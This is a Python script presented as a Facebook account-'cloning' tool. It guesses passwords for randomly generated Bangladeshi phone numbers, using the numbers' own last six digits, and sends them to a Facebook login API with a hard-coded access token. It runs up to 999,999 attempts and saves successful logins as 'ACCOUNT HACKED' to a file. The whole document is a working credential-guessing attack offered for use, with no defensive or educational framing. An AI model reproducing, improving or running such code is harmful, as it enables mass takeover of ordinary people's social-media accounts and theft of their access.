#!/bin/python
import os
import sys
import random
import mechanize
import json
import time
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    lili = '\033[4m'
    wd = "\033[90;1m"  # dark
    GL = "\033[96;1m"  # Blue aqua
    BB = "\033[34;1m"  # Blue light
    YY = "\033[33;1m"  # Yellow light
    GG = "\033[32;1m"  # Green light
    WW = "\033[0;1m"  # White light
    Y = "\033[33;1m"  # Yellow
    G = "\033[32m"  # Green
    W = "\033[0;1m"  # White
    R = "\033[31;1m"  # Red
    C = "\033[36;1m"  # Cyan
    pur = "\033[35m"
    yel = "\033[93m"
    green = "\033[42m"
    orange = "\033[43m"
    orr = '\033[33m'
    OKCYAN = "\033[36m"
    lightblue = '\033[94m'
    CGREENBG2 = '\33[102m'
os.system('clear')
def login():
    username = "darknethaxor"
    password = "nightrage"
    uin = input(f"{bcolors.BOLD}{bcolors.OKGREEN}USERNAME: {bcolors.ENDC}")
    if uin == username:
        pasu = input(f"{bcolors.BOLD}{bcolors.OKGREEN}PASSWORD: {bcolors.ENDC}")
        if pasu == password:
            print(f"{bcolors.lightblue}Approved!{bcolors.ENDC}")
    else:
        sys.exit()
    os.system('clear')
def digit():
    print(f"{bcolors.BOLD}[1] 6 digit{bcolors.ENDC}")
    print(f"{bcolors.BOLD}[2] 7 digit{bcolors.ENDC}")
    print(f"{bcolors.BOLD}[3] 8 digit{bcolors.ENDC}")
    print(f"{bcolors.BOLD}[4] 9 digit{bcolors.ENDC}")
    print(f"{bcolors.BOLD}[5] 10 digit{bcolors.ENDC}")
    print(f"{bcolors.BOLD}[6] 11 digit{bcolors.ENDC}")
def logo():
    print("\n")
    print(f"{bcolors.C}    _   ___       __    __        ____          {bcolors.ENDC}")
    print(f"{bcolors.C}   / | / (_)___ _/ /_  / /_      / __ \____ _____ ____   {bcolors.ENDC}")
    print(f"{bcolors.C}  /  |/ / / __ `/ __ \/ __/_____/ /_/ / __ `/ __ `/ _ \  {bcolors.ENDC}")
    print(f"{bcolors.C} / /|  / / /_/ / / / / /_/_____/ _, _/ /_/ / /_/ /  __/ {bcolors.ENDC}")
    print(f"{bcolors.C}/_/ |_/_/\__, /_/ /_/\__/     /_/ |_|\__,_/\__, /\___/  {bcolors.ENDC}")
    print(f"{bcolors.C}        /____/                            /____/        {bcolors.ENDC}\n")
    print(f"{bcolors.C}{bcolors.BOLD}{bcolors.lili}Darknethaxor{bcolors.ENDC} {bcolors.lili}{bcolors.C}{bcolors.BOLD}Made By Farhan{bcolors.ENDC}   {bcolors.OKGREEN}{bcolors.BOLD}{bcolors.lili}VERSION: 1.0{bcolors.ENDC}")
    print(f"{bcolors.lightblue}{bcolors.lili}{bcolors.BOLD}---------------------------------------------------------{bcolors.ENDC}")
    print(f"{bcolors.C}{bcolors.BOLD}AUTHOR        : DARKNET HAXOR{bcolors.ENDC}")
    print(f"{bcolors.C}{bcolors.BOLD}PAGE          : FACEBOOK.COM/DARKNETHAXOR{bcolors.ENDC}")
    print(f"{bcolors.C}{bcolors.BOLD}YOUTUBE       : YOUTUBE.COM/DARKNETHAXOR {bcolors.ENDC}")
    print(f"{bcolors.C}{bcolors.BOLD}CONTACT       : FACEBOOK.COM/FARHAN {bcolors.ENDC}")
    print(f"{bcolors.lightblue}{bcolors.lili}{bcolors.BOLD}---------------------------------------------------------{bcolors.ENDC}\n")
def select():
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}Chose Digit: {bcolors.ENDC}",end="")
    digiin = input("")


def logger():
    i = 1
    while i < 999999:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        login = 'https://www.facebook.com/login.php?login_attempt=1'
        use1 = 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck', 'Google chrome', 'Fire fox'
        header = random.choice(use1)
        number = str(random.randint(1111111, 9999999))
        full = "0" + adder + number
        lol = str(full)
        digi6 = lol[5:11]
        br.set_handle_referer(True)
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        sys.stdout.flush()
        br.addheaders = [('User-agent', header)]
        result = "+88"+lol + "||" + digi6 + "\n\n"
#        if content == 'https://www.facebook.com' or content!='https://www.facebook.com/checkpoint/?next' or content == 'https://www.facebook.com' :
        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + lol + '&locale=en_US&password=' + digi6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
        a = json.load(data)
        if 'access_token' in a:
            result = lol + "||" + digi6
            print(f"\n\n{bcolors.BOLD}{bcolors.OKGREEN}[+] ACCOUNT HACKED = {bcolors.ENDC}",end="")
            print(lol)
            print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Password Find = {bcolors.ENDC}",end="")
            print(digi6)
            filer = open("successfull.txt","a")
            wrote= filer.write(result)
            filer.close()
        elif 'www.facebook.com' in a['error_msg']:
            result = "+88"+lol + "||" + digi6 + "\n\n"
            print(f"\n\n{bcolors.BOLD}{bcolors.OKCYAN}[+] Open After 7 days[Checkpoint] = {bcolors.ENDC}", end="")
            print(lol,end="")
            print(f"{bcolors.BOLD}{bcolors.OKCYAN} || {bcolors.ENDC}",end="")
            print(digi6)
            file = open("checkpoint.txt", "a")
            writer = file.write(result)
            file.close()
        else:
            continue
        i = i + 1
def choser():
    print(f"{bcolors.OKGREEN}{bcolors.BOLD}ONLY BANGLADESHI ACCOUNTS ARE AVAILABLE{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}{bcolors.BOLD}---------------------------------------------{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}{bcolors.BOLD}1.Banglalink{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}{bcolors.BOLD}2.Teletalk{bcolors.ENDC}")
    print(f"{bcolors.Y}{bcolors.BOLD}3.Robi{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}{bcolors.BOLD}4.Airtel{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}{bcolors.BOLD}5.Grameenphone{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}{bcolors.BOLD}---------------------------------------------{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}{bcolors.BOLD}===> {bcolors.ENDC}",end="")
def processor():
    logo()
    print(f"{bcolors.OKGREEN}{bcolors.BOLD}ONLY BANGLADESHI ACCOUNTS ARE CLONING{bcolors.ENDC}\n")
    print(f"{bcolors.YY}[+] 999999 Numbers Has Generated.{bcolors.ENDC}")
    print(f"{bcolors.YY}[+] To Stop The process press CTRL+Z.{bcolors.ENDC}")
    print(f"{bcolors.YY}[+] Please Wait Accounts are Cloning............{bcolors.ENDC}\n")
    print(f"{bcolors.C}                     TEAM DARKNETHAXOR                             {bcolors.ENDC}\n              ")
logo()
CorrectUsername = "darknethaxor"
CorrectPassword = "nightrage"
loop = 'true'
while (loop == 'true'):
    username = input(f"{bcolors.BOLD}{bcolors.OKGREEN}\nUSERNAME: {bcolors.ENDC}")
    if (username == CorrectUsername):
        password = input(f"{bcolors.BOLD}{bcolors.OKGREEN}\nPASSWORD: {bcolors.ENDC}")
        if (password == CorrectPassword):
            print(f"{bcolors.lightblue}Approved!{bcolors.ENDC}")
            time.sleep(2)
            loop = 'false'
        else:
            print("wrong password")
            os.system('xdg-open https://www.facebook.com/groups/1546183828897889')
    else:
        print("wrong username")
        os.system('xdg-open https://www.facebook.com/groups/1546183828897889')
os.system('clear')
logo()
print("\n")
choser()
simchose =str(input())
os.system('clear')
if simchose == "5":
    os.system('clear')
    logo()
    print(f"\n{bcolors.BOLD}{bcolors.OKCYAN}170,171,172,173,174,175,176,178,179,130,131,132,133,134,135,136,137,138,139{bcolors.ENDC}")
    print(f"\n{bcolors.OKGREEN}==>Chose code: {bcolors.ENDC}", end="")
    add = str(input())
elif simchose == "2":
    print(f"\n{bcolors.BOLD}{bcolors.OKCYAN}150,151,152,153,154,155,156,157,158,159{bcolors.ENDC}")
    print(f"\n{bcolors.OKGREEN}==>Chose code: {bcolors.ENDC}", end="")
    add = str(input())
elif simchose == "3":
    print(f"\n{bcolors.BOLD}{bcolors.OKCYAN}180,181,182,183,184,185,186,187,188,189{bcolors.ENDC}")
    print(f"\n{bcolors.OKGREEN}==>Chose code: {bcolors.ENDC}", end="")
    add = str(input())
elif simchose == "4":
    print(f"\n{bcolors.BOLD}{bcolors.OKCYAN}160,161,162,163,164,165,166,167,168,169{bcolors.ENDC}")
    print(f"\n{bcolors.OKGREEN}==>Chose code: {bcolors.ENDC}", end="")
    add = str(input())
elif simchose == "1":
    print(f"\n{bcolors.OKCYAN}190,191,192,193,194,195,196,197,198,199,140,141,142,143,144,145,146,147,148,149{bcolors.ENDC}")
    print(f"\n{bcolors.OKGREEN}==>Chose code: {bcolors.ENDC}", end="")
    add = str(input())
else:
    print("fuck u")
    sys.exit()
adder=add
os.system('clear')
processor()
logger()
